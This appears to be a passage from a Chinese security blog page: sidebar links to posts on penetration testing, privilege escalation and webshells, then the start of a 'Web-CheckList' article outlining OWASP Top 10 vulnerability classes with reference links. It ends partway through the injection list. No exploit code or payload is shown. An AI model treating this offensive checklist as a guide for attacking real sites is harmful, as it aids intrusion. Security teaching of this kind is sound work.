+            <span class="post-title" title="PHP代码审计学习1">PHP代码审计学习1</span>
+            <span class="post-date" title="2019-12-12 15:39:42">2019/12/12</span>
+        </a>
+        
+        <a  class=""
+           href="/PHP%E5%AD%A6%E4%B9%A0/"
+           data-tag="知识,PHP"
+           data-author="" >
+            <span class="post-title" title="PHP学习">PHP学习</span>
+            <span class="post-date" title="2020-01-01 23:49:08">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
+           data-tag="CTF,PWN"
+           data-author="" >
+            <span class="post-title" title="PWN之程序常用的保护机制">PWN之程序常用的保护机制</span>
+            <span class="post-date" title="2019-12-05 15:59:05">2019/12/05</span>
+        </a>
+        
+        <a  class=""
+           href="/PWN%E5%AD%A6%E4%B9%A0/"
+           data-tag="CTF,PWN"
+           data-author="" >
+            <span class="post-title" title="PWN学习">PWN学习</span>
+            <span class="post-date" title="2019-12-04 22:13:47">2019/12/04</span>
+        </a>
+        
+        <a  class=""
+           href="/Powershell/"
+           data-tag="工具,powershell,域渗透"
+           data-author="" >
+            <span class="post-title" title="Powershell">Powershell</span>
+            <span class="post-date" title="2020-01-15 14:42:24">2020/01/15</span>
+        </a>
+        
+        <a  class=""
+           href="/Python-requests/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
+            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
+        </a>
+        
+        <a  class=""
+           href="/Python%E5%9F%BA%E7%A1%80/"
+           data-tag="知识,python"
+           data-author="" >
+            <span class="post-title" title="Python3基础">Python3基础</span>
+            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
+        </a>
+        
+        <a  class=""
+           href="/SQL%E6%B3%A8%E5%85%A5/"
+           data-tag="注入,phpmyadmin,SQL"
+           data-author="" >
+            <span class="post-title" title="SQL注入">SQL注入</span>
+            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
+        </a>
+        
+        <a  class=""
+           href="/SqlServer/"
+           data-tag="数据库,mssql"
+           data-author="" >
+            <span class="post-title" title="SqlServer">SqlServer</span>
+            <span class="post-date" title="2020-05-24 19:54:32">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/SSRF/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF">SSRF</span>
+            <span class="post-date" title="2020-01-24 11:50:18">2020/01/24</span>
+        </a>
+        
+        <a  class=""
+           href="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/"
+           data-tag="漏洞,Struts2,vulhub"
+           data-author="" >
+            <span class="post-title" title="Struts2漏洞系列">Struts2漏洞系列</span>
+            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/Sqlmap/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="Sqlmap">Sqlmap</span>
+            <span class="post-date" title="2020-05-24 01:39:30">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/Thinkphp/"
+           data-tag="漏洞,vulhub,CVE"
+           data-author="" >
+            <span class="post-title" title="Thinkphp">Thinkphp</span>
+            <span class="post-date" title="2020-03-31 20:38:23">2020/03/31</span>
+        </a>
+        
+        <a  class=""
+           href="/Tomcat/"
+           data-tag="漏洞,中间件"
+           data-author="" >
+            <span class="post-title" title="Tomcat">Tomcat</span>
+            <span class="post-date" title="2020-05-14 20:46:32">2020/05/14</span>
+        </a>
+        
+        <a  class=""
+           href="/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E7%9F%A5%E8%AF%86/"
+           data-tag="工具,windows"
+           data-author="" >
+            <span class="post-title" title="Windows之认证知识">Windows之认证知识</span>
+            <span class="post-date" title="2020-04-19 15:08:46">2020/04/19</span>
+        </a>
+        
+        <a  class=""
+           href="/Windows%E5%AE%89%E5%85%A8/"
+           data-tag="应急响应,windows"
+           data-author="" >
+            <span class="post-title" title="Windows安全">Windows安全</span>
+            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
+        </a>
+        
+        <a  class=""
+           href="/backdoors/"
+           data-tag="backdoor"
+           data-author="" >
+            <span class="post-title" title="backdoors">backdoors</span>
+            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
+        </a>
+        
+        <a  class=""
+           href="/XSS/"
+           data-tag="漏洞,bypass,xss,DOM"
+           data-author="" >
+            <span class="post-title" title="XSS">XSS</span>
+            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
+        </a>
+        
+        <a  class=""
+           href="/docker%E4%BD%BF%E7%94%A8/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="docker使用">docker使用</span>
+            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/dedecms/"
+           data-tag="漏洞,cms"
+           data-author="" >
+            <span class="post-title" title="dedecms">dedecms</span>
+            <span class="post-date" title="2020-08-14 21:16:51">2020/08/14</span>
+        </a>
+        
+        <a  class=""
+           href="/hashcat/"
+           data-tag="工具"
+           data-author="" >
+            <span class="post-title" title="hashcat">hashcat</span>
+            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/hexo-help/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="hexo_help">hexo_help</span>
+            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
+        </a>
+        
+        <a  class=""
+           href="/phpmyadmin/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
+            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
+        </a>
+        
+        <a  class=""
+           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
+           data-tag="知识,encode_decode"
+           data-author="" >
+            <span class="post-title" title="python与编码解码">python与编码解码</span>
+            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
+        </a>
+        
+        <a  class=""
+           href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="python小脚本">python小脚本</span>
+            <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
+        </a>
+        
+        <a  class=""
+           href="/shell/"
+           data-tag="shell,后门"
+           data-author="" >
+            <span class="post-title" title="shell">shell</span>
+            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
+           data-tag="靶场,vulnhub,僵尸网络"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之Bitbot.VulnVM-disk1">完结-vulnhub之Bitbot.VulnVM-disk1</span>
+            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之21LTLTR_Scene_1">完结-vulnhub之21LTLTR_Scene_1</span>
+            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF5">完结-vulnhub之LAMPSecurity-CTF5</span>
+            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF4">完结-vulnhub之LAMPSecurity-CTF4</span>
+            <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF6">完结-vulnhub之LAMPSecurity-CTF6</span>
+            <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF7">完结-vulnhub之LAMPSecurity-CTF7</span>
+            <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8Bchanakya/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之chanakya">完结-vulnhub之chanakya</span>
+            <span class="post-date" title="2020-12-05 21:43:10">2020/12/05</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF8">完结-vulnhub之LAMPSecurity-CTF8</span>
+            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnhub%E4%B9%8Bdhanush/"
+           data-tag="靶场,vulnhub"
+           data-author="" >
+            <span class="post-title" title="完结-vulnhub之dhanush">完结-vulnhub之dhanush</span>
+            <span class="post-date" title="2020-12-06 00:04:55">2020/12/06</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/"
+           data-tag="内网渗透,域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结—vulnstack红队评估一">完结—vulnstack红队评估一</span>
+            <span class="post-date" title="2021-01-03 20:11:14">2021/01/03</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/"
+           data-tag="域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结——vulnstack红队评估三">完结——vulnstack红队评估三</span>
+            <span class="post-date" title="2021-01-18 20:31:30">2021/01/18</span>
+        </a>
+        
+        <a  class=""
+           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/"
+           data-tag="内网渗透,域渗透,靶场"
+           data-author="" >
+            <span class="post-title" title="完结-vulnstack红队评估二">完结-vulnstack红队评估二</span>
+            <span class="post-date" title="2020-07-25 23:38:38">2020/07/25</span>
+        </a>
+        
+        <a  class=""
+           href="/webshell/"
+           data-tag="shell,webshell,内存马"
+           data-author="" >
+            <span class="post-title" title="webshell">webshell</span>
+            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
+        </a>
+        
+        <a  class=""
+           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="信息安全百科">信息安全百科</span>
+            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%95%E8%BF%87/"
+           data-tag="bypass,远控,免杀"
+           data-author="" >
+            <span class="post-title" title="免杀 &amp;&amp; 绕过">免杀 &amp;&amp; 绕过</span>
+            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
+           data-tag="内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
+            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLinux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="内网渗透之Linux">内网渗透之Linux</span>
+            <span class="post-date" title="2020-10-30 16:15:14">2020/10/30</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
+            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
+           data-tag="工具,内网渗透,域渗透,windows,mimikatz"
+           data-author="" >
+            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
+            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
+           data-tag="知识,漏洞"
+           data-author="" >
+            <span class="post-title" title="同源策略">同源策略</span>
+            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
+            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
+           data-tag="信息搜集,CDN"
+           data-author="" >
+            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
+            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux">提权之Linux</span>
+            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
+            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
+           data-tag="windows,提权,DLL"
+           data-author="" >
+            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
+            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
+            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="正则表达式">正则表达式</span>
+            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="渗透工具">渗透工具</span>
+            <span class="post-date" title="2021-01-07 22:47:15">2021/01/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="信息搜集"
+           data-author="" >
+            <span class="post-title" title="渗透测试之信息搜集">渗透测试之信息搜集</span>
+            <span class="post-date" title="2020-08-25 00:36:08">2020/08/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BA%AF%E6%BA%90/"
+           data-tag="蓝方,防守"
+           data-author="" >
+            <span class="post-title" title="溯源">溯源</span>
+            <span class="post-date" title="2020-12-08 21:43:32">2020/12/08</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
+           data-tag="工具,内网渗透,端口"
+           data-author="" >
+            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
+            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
+            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞,editor"
+           data-author="" >
+            <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
+            <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳二">脱壳二</span>
+            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳一">脱壳一</span>
+            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/ATTACK%E5%AD%A6%E4%B9%A0/"
+           data-tag="知识,backdoor,shell"
+           data-author="" >
+            <span class="post-title" title="ATTACK学习">ATTACK学习</span>
+            <span class="post-date" title="2020-01-13 10:26:28">2020/01/13</span>
+        </a>
+        
+        <a  class=""
+           href="/Web-CheckList/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
+            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%97%A5%E5%BF%97/"
+           data-tag="log,后渗透,FTP,日志"
+           data-author="" >
+            <span class="post-title" title="日志">日志</span>
+            <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="漏洞记录">漏洞记录</span>
+            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Web-CheckList" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Web-CheckList</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color3">知识</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title=''>2020-10-28 15:18<br/>
+        更新时间: 2021-01-06 23:50:02
+        </time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Web-OWASP-TOP-10"><span class="toc-text">0x00 Web OWASP TOP 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Other"><span class="toc-text">0x01 Other</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-注入"><span class="toc-text">0x10 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-SQL注入"><span class="toc-text">0x11 SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-LDAP注入"><span class="toc-text">0x12 LDAP注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-CRLF注入"><span class="toc-text">0x13 CRLF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-代码注入"><span class="toc-text">0x14 代码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#框架注入"><span class="toc-text">框架注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#链接注入"><span class="toc-text">链接注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-失效的身份认证"><span class="toc-text">0x20 失效的身份认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#身份认证漏洞"><span class="toc-text">身份认证漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证码"><span class="toc-text">验证码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-敏感信息泄露"><span class="toc-text">0x30 敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-XML外部实体注入攻击（XXE）"><span class="toc-text">0x40 XML外部实体注入攻击（XXE）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-失效的访问控制"><span class="toc-text">0x50 失效的访问控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-安全配置错误"><span class="toc-text">0x60 安全配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x61-URL跳转漏洞"><span class="toc-text">0x61 URL跳转漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-跨站脚本（XSS）"><span class="toc-text">0x70 跨站脚本（XSS）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-不安全的反序列化"><span class="toc-text">0x80 不安全的反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x90-使用含有已知漏洞的组件"><span class="toc-text">0x90 使用含有已知漏洞的组件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xA0-不足的日志记录和监控"><span class="toc-text">0xA0 不足的日志记录和监控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0xA1-各种日志"><span class="toc-text">0xA1 各种日志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xB0-其他1"><span class="toc-text">0xB0 其他1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash点击劫持"><span class="toc-text">Flash点击劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash跨域漏洞"><span class="toc-text">Flash跨域漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP参数污染"><span class="toc-text">HTTP参数污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-sys远程代码执行漏洞（CVE-2015-1635-MS15-034）"><span class="toc-text">HTTP.sys远程代码执行漏洞（CVE-2015-1635 MS15-034）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS短文件名泄露漏洞"><span class="toc-text">IIS短文件名泄露漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp劫持"><span class="toc-text">jsonp劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传漏洞一（针对图片）"><span class="toc-text">文件上传漏洞一（针对图片）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传漏洞二-web-config"><span class="toc-text">文件上传漏洞二 web.config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传漏洞三-htaccess"><span class="toc-text">文件上传漏洞三 .htaccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解析漏洞"><span class="toc-text">解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地文件包含漏洞与远程文件包含漏洞"><span class="toc-text">本地文件包含漏洞与远程文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#缓慢的HTTP拒绝服务攻击"><span class="toc-text">缓慢的HTTP拒绝服务攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF服务器请求伪造"><span class="toc-text">SSRF服务器请求伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附录0x01-——参考零组资料文库"><span class="toc-text">附录0x01 ——参考零组资料文库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附录0x02"><span class="toc-text">附录0x02</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-Web-OWASP-TOP-10"><a href="#0x00-Web-OWASP-TOP-10" class="headerlink" title="0x00 Web OWASP TOP 10"></a>0x00 Web OWASP TOP 10</h2><ol>
+<li>注入</li>
+<li>失效的身份认证</li>
+<li>敏感信息泄露</li>
+<li>XML外部实体注入攻击（XXE）</li>
+<li>失效的访问控制</li>
+<li>安全配置错误</li>
+<li>跨站脚本（XSS）</li>
+<li>不安全的反序列化</li>
+<li>使用含有已知漏洞的组件</li>
+<li>不足的日志记录和监控</li>
+</ol>
+<p><a href="https://help.aliyun.com/product/35474.html" target="_blank" rel="noopener">安全公告和技术阿里云</a></p>
+<h2 id="0x01-Other"><a href="#0x01-Other" class="headerlink" title="0x01 Other"></a>0x01 Other</h2><ol>
+<li>CSRF</li>
+<li>Flash点击劫持</li>
+<li>Flash跨域漏洞</li>
+<li>HTTP参数污染</li>
+<li>HTTP.sys远程代码执行漏洞（CVE-2015-1635 MS15-034）</li>
+<li>IIS短文件名泄露漏洞</li>
+<li>jsonp劫持</li>
+<li>文件上传漏洞一（针对图片）</li>
+<li>文件上传漏洞二 web.config</li>
+<li>文件上传漏洞三 .htaccess</li>
+<li>文件解析漏洞</li>
+<li>本地文件包含漏洞与远程文件包含漏洞</li>
+<li>缓慢的HTTP拒绝服务攻击</li>
+<li>SSRF服务器请求伪造</li>
+</ol>
+<h2 id="0x10-注入"><a href="#0x10-注入" class="headerlink" title="0x10 注入"></a>0x10 注入</h2><p>描述：</p>
+<ul>
+<li>程序缺少对用户的输入进行有效的安全性检查所引起的，攻击者把一些包含指令的数据发送给解释器，解释器会把收到的指令转换成指令执行。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>注入可能导致数据丢失或数据破坏、缺乏可审计性 或是拒绝服务。注入漏洞有时甚至能导致完全接管主机。</li>
+</ul>
+<ul>
+<li>SQL注入</li>
+<li>cookie注入</li>
+<li>命令注入 <a href="https://xz.aliyun.com/t/4613" target="_blank" rel="noopener">https://xz.aliyun.com/t/4613</a></li>
+<li>代码注入</li>
+<li><ul>
+<li>框架注入</li>
+</ul>
+</li>
+<li>XML外部实体注入攻击 <a href="https://www.freebuf.com/vuls/175451.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175451.html</a></li>
+<li>SSI注入（服务端包含注入）<a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></li>
+<li>SSTI（服务端模板注入）</li>
+<li><ul>
+<li><a href="https://www.freebuf.com/articles/web/88768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/88768.html</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://www.freebuf.com/articles/web/227519.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/227519.html</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://www.freebuf.com/articles/web/246832.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/246832.html</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://xz.aliyun.com/t/7746" target="_blank" rel="noopener">https://xz.aliyun.com/t/7746</a></li>
+</ul>
+</li>
+<li>LDAP注入 </li>
+<li>JNDI注入 <a href="https://xz.aliyun.com/t/8214" target="_blank" rel="noopener">https://xz.aliyun.com/t/8214</a></li>
+<li>表达式注入 </li>
+<li><ul>
+<li><a href="https://xz.aliyun.com/t/8299" target="_blank" rel="noopener">https://xz.aliyun.com/t/8299</a></li>
+</ul>
+</li>
